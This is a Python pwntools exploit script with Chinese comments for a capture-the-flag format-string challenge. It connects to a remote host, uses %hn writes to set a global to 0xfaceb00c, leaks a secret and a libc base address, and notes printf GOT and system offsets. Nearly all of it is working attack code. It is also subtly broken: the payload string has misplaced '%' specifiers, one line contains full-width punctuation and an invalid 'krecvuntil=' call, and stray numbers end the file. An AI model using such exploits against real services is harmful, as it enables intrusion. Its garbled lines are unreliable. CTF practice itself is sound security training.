#!/usr/bin/env python
# 题目 a=0xfaceb00c 时得到flag, 未开PIE
host, port = '60.251.236.18', 10129

y = remote(host, port)

a = 0x6012ac

# p = '%p.' * 20
# 数到 0x70252e70252e7025 这个值 小端 70-p 25-% 2e-. 它是第16个

# p = '%16$p.'.ljust(0x30)
# 第16个开始format string位置, 是第1个8bytes, 0x30=48=16*3

# p = '%22$p.'.ljust(0x30) + p64(0x777777)
# 0x777777 解释: 0x30=48=6*8 6个8bytes。所以进行16+6=22

#0xfaceb00c 直接写太大了，用hn2bytes写入
#0xb00c => 45068 小端先写低位
#0xface => 64206
#0xface - 0xb00c = 19138
p = '%45068c22$hn%19138c$hn23'.ljust(0x30, '\x00') + p64(a) + p64(a+2)
# 前面是22个，下一位是第23
y.sendafter('name ?', p)

y.interactive()

y.recvuntil('ABC0x')

# sudo gdb ./fmt1
# x/64gx 0x6012ac
# 0x6012ac<a>: 0x00000000faceb00c

secret = p64(int(y.krecvuntil=('.0x')[：-3]， 16)) + p64(int(y.recvuntil('ABC')[:-3], 16))
libc = u64(y.recv(6).ljust(8, '\x00') ) - 0x21ab0
success('libc = %s' % hex(libc))

print(y.recvuntil('}'))
y.sendafter('?', secret)
print(y.recvuntil('}'))

printf_got = 0x601230
system = libc+0x4f440

# char name[0x60], secret[0x10], buf[0x30]
# 我们继续向后读，是可以读到 secret 的。

1 39 39